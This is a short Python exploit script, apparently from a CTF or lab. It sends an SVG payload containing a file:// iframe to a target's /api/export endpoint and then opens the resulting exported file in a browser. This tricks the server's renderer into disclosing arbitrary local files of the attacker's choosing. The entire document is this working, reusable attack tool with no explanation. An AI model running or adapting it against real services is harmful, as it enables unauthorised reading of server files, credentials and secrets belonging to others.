import requests
import webbrowser

url = input("Input URL: ")

while True:
    string_path = input("Input path: ")
    
    if string_path == '0':
        break

    payload = {
    "svg": f"<svg-dummy></svg-dummy><iframe src=\"file://{string_path}\" width=\"1000px\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"0\" class=\"class\" id=\"data\">data</text></svg>"
    }   

    response = requests.post(url + "/api/export", json=payload)

    print(response.status_code)
    print(response.text)

    if 'fileName' in response.json():
        new_url = url + "/exports/" + response.json()['fileName']
        webbrowser.open_new_tab(new_url)
    else:
        print("Dont have 'fileName' in response.")
